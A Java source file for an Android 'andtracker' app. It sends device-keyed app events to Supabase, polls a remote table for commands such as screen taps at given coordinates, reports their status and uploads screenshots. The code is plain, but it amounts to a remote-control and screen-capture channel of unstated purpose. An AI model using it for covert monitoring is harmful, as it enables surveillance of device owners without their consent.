package com.andtracker;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.OutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public final class SupabaseAndroidEventsClient {
    private static final String TAG = "SupabaseEvents";
    private static final ExecutorService EXECUTOR = Executors.newSingleThreadExecutor();
    private static final String SCREENSHOT_BUCKET = "android";

    private SupabaseAndroidEventsClient() {}

    public static void sendEvent(
            Context context,
            String packageName,
            String eventType,
            String eventValue
    ) {
        final String supabaseUrl = BuildConfig.SUPABASE_URL;
        final String supabaseAnonKey = BuildConfig.SUPABASE_ANON_KEY;

        if (supabaseUrl == null || supabaseUrl.isEmpty() || supabaseAnonKey == null || supabaseAnonKey.isEmpty()) {
            Log.e(TAG, "Supabase non configuré. Ajoute SUPABASE_URL et SUPABASE_ANON_KEY dans android-app/local.properties");
            return;
        }

        final String deviceId = getAndroidId(context);

        EXECUTOR.execute(() -> {
            HttpURLConnection connection = null;
            try {
                URL url = new URL(supabaseUrl + "/rest/v1/android_events");
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setConnectTimeout(5000);
                connection.setReadTimeout(5000);
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("apikey", supabaseAnonKey);
                connection.setRequestProperty("Authorization", "Bearer " + supabaseAnonKey);
                connection.setRequestProperty("Prefer", "return=minimal");
                connection.setDoOutput(true);

                JSONObject json = new JSONObject();
                if (deviceId != null) json.put("device_id", deviceId);
                if (packageName != null) json.put("package_name", packageName);
                if (eventType != null) json.put("event_type", eventType);
                if (eventValue != null) json.put("event_value", eventValue);

                byte[] input = json.toString().getBytes(StandardCharsets.UTF_8);
                try (OutputStream os = connection.getOutputStream()) {
                    os.write(input);
                }

                int responseCode = connection.getResponseCode();
                if (responseCode == 201 || responseCode == 200) {
                    Log.d(TAG, "Event envoyé");
                } else {
                    Log.e(TAG, "Échec envoi event. Code=" + responseCode);
                }
            } catch (Exception e) {
                Log.e(TAG, "Erreur envoi event", e);
            } finally {
                if (connection != null) connection.disconnect();
            }
        });
    }

    /**
     * Lit une commande en attente depuis la table `android_commands` (polling REST).
     *
     * Table attendue (minimum):
     * - id (uuid)
     * - device_id (text)
     * - command_type (text) ex: "tap"
     * - payload (jsonb) ex: {"x":123,"y":456}
     * - status (text) ex: "pending" | "done" | "error"
     */
    public static JSONObject fetchNextPendingCommand(Context context) {
        final String supabaseUrl = BuildConfig.SUPABASE_URL;
        final String supabaseAnonKey = BuildConfig.SUPABASE_ANON_KEY;
        if (supabaseUrl == null || supabaseUrl.isEmpty() || supabaseAnonKey == null || supabaseAnonKey.isEmpty()) {
            Log.e(TAG, "Supabase non configuré (commands).");
            return null;
        }

        final String deviceId = getAndroidId(context);
        if (deviceId == null || deviceId.trim().isEmpty()) return null;

        HttpURLConnection connection = null;
        try {
            // GET /rest/v1/android_commands?device_id=eq.<id>&status=eq.pending&select=...&order=created_at.asc&limit=1
            String urlStr = supabaseUrl
                    + "/rest/v1/android_commands"
                    + "?device_id=eq." + URLEncoder.encode(deviceId, "UTF-8")
                    + "&status=eq.pending"
                    + "&select=id,command_type,payload"
                    + "&order=created_at.asc"
                    + "&limit=1";

            URL url = new URL(urlStr);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.setRequestProperty("Accept", "application/json");
            connection.setRequestProperty("apikey", supabaseAnonKey);
            connection.setRequestProperty("Authorization", "Bearer " + supabaseAnonKey);

            int responseCode = connection.getResponseCode();
            String body = readResponseBody(connection);
            if (responseCode != 200) {
                Log.e(TAG, "fetchNextPendingCommand: HTTP " + responseCode + " body=" + safeTrim(body));
                return null;
            }

            JSONArray arr = new JSONArray(body == null ? "[]" : body);
            if (arr.length() == 0) return null;
            return arr.getJSONObject(0);
        } catch (Exception e) {
            Log.e(TAG, "fetchNextPendingCommand: erreur", e);
            return null;
        } finally {
            if (connection != null) connection.disconnect();
        }
    }

    /**
     * Met à jour une commande dans `android_commands` (status + result + executed_at).
     */
    public static boolean updateCommandStatus(Context context, String id, String status, JSONObject result) {
        final String supabaseUrl = BuildConfig.SUPABASE_URL;
        final String supabaseAnonKey = BuildConfig.SUPABASE_ANON_KEY;
        if (supabaseUrl == null || supabaseUrl.isEmpty() || supabaseAnonKey == null || supabaseAnonKey.isEmpty()) {
            Log.e(TAG, "Supabase non configuré (commands update).");
            return false;
        }
        if (id == null || id.trim().isEmpty()) return false;

        HttpURLConnection connection = null;
        try {
            String urlStr = supabaseUrl + "/rest/v1/android_commands?id=eq." + URLEncoder.encode(id, "UTF-8");
            URL url = new URL(urlStr);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("PATCH");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Accept", "application/json");
            connection.setRequestProperty("apikey", supabaseAnonKey);
            connection.setRequestProperty("Authorization", "Bearer " + supabaseAnonKey);
            connection.setRequestProperty("Prefer", "return=minimal");
            connection.setDoOutput(true);

            JSONObject payload = new JSONObject();
            if (status != null) payload.put("status", status);
            if (result != null) payload.put("result", result);
            payload.put("executed_at", isoNowUtc());

            byte[] input = payload.toString().getBytes(StandardCharsets.UTF_8);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(input);
            }

            int responseCode = connection.getResponseCode();
            if (responseCode == 204 || responseCode == 200) {
                return true;
            }

            String body = readResponseBody(connection);
            Log.e(TAG, "updateCommandStatus: HTTP " + responseCode + " body=" + safeTrim(body));
            return false;
        } catch (Exception e) {
            Log.e(TAG, "updateCommandStatus: erreur", e);
            return false;
        } finally {
            if (connection != null) connection.disconnect();
        }
    }

    /**
     * Upload un screenshot (image) dans Supabase Storage.
     * Chemin: bucket "android" / <objectPath>
     *
     * Prérequis côté Supabase:
     * - bucket "android" existe
     * - policy Storage autorisant l'upload avec la clé utilisée (anon/service)
     */
    public static void uploadScreenshot(Context context, byte[] bytes, String objectPath, String contentType) {
        uploadScreenshot(context, bytes, objectPath, contentType, false);
    }

    /**
     * @param upsert si true, écrase le fichier s'il existe déjà (utile pour _folder.txt)
     */
    public static void uploadScreenshot(Context context, byte[] bytes, String objectPath, String contentType, boolean upsert) {
        if (context == null || bytes == null || bytes.length == 0) return;

        final String supabaseUrl = BuildConfig.SUPABASE_URL;
        final String supabaseAnonKey = BuildConfig.SUPABASE_ANON_KEY;
        if (supabaseUrl == null || supabaseUrl.isEmpty() || supabaseAnonKey == null || supabaseAnonKey.isEmpty()) {
            Log.e(TAG, "Supabase non configuré (storage). Ajoute SUPABASE_URL et SUPABASE_ANON_KEY.");
            return;
        }

        if (objectPath == null || objectPath.trim().isEmpty()) return;
        final String encodedPath = encodePathPreservingSlashes(objectPath);
        final String ct = (contentType == null || contentType.trim().isEmpty()) ? "application/octet-stream" : contentType.trim();

        EXECUTOR.execute(() -> {
            HttpURLConnection connection = null;
            try {
                URL url = new URL(supabaseUrl + "/storage/v1/object/" + SCREENSHOT_BUCKET + "/" + encodedPath);
                connection = (HttpURLConnection) url.openConnection();
                // Supabase Storage accepte POST pour upload.
                connection.setRequestMethod("POST");
                connection.setConnectTimeout(5000);
                connection.setReadTimeout(5000);
                connection.setRequestProperty("Content-Type", ct);
                connection.setRequestProperty("apikey", supabaseAnonKey);
                connection.setRequestProperty("Authorization", "Bearer " + supabaseAnonKey);
                if (upsert) {
                    connection.setRequestProperty("x-upsert", "true");
                }
                connection.setDoOutput(true);

                try (OutputStream os = connection.getOutputStream()) {
                    os.write(bytes);
                }

                int responseCode = connection.getResponseCode();
                if (responseCode == 200 || responseCode == 201) {
                    Log.d(TAG, "Screenshot upload OK: " + objectPath + " (" + bytes.length + " bytes, " + ct + ")");
                } else {
                    String body = readResponseBody(connection);
                    Log.e(TAG, "Échec upload screenshot. Code=" + responseCode + " path=" + objectPath + " body=" + safeTrim(body));
                }
            } catch (Exception e) {
                Log.e(TAG, "Erreur upload screenshot", e);
            } finally {
                if (connection != null) connection.disconnect();
            }
        });
    }

    public static String getAndroidIdOrNull(Context context) {
        return getAndroidId(context);
    }

    private static String getAndroidId(Context context) {
        try {
            return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Encode chaque segment (entre /) en URL, en conservant les '/'.
     * URLEncoder encode les espaces en '+', mais on n'en a pas ici.
     */
    private static String encodePathPreservingSlashes(String path) {
        if (path == null) return "";
        try {
            String[] parts = path.split("/");
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < parts.length; i++) {
                if (i > 0) sb.append('/');
                sb.append(URLEncoder.encode(parts[i], "UTF-8"));
            }
            return sb.toString();
        } catch (Exception e) {
            return path;
        }
    }

    private static String readResponseBody(HttpURLConnection connection) {
        if (connection == null) return null;
        InputStream is = null;
        try {
            is = connection.getErrorStream();
            if (is == null) is = connection.getInputStream();
            if (is == null) return null;

            BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            try { if (is != null) is.close(); } catch (Exception ignored) {}
        }
    }

    private static String safeTrim(String s) {
        if (s == null) return "null";
        String t = s.trim();
        if (t.length() > 600) return t.substring(0, 600) + "…";
        return t;
    }

    private static String isoNowUtc() {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
            sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
            return sdf.format(new Date());
        } catch (Exception e) {
            return null;
        }
    }
}

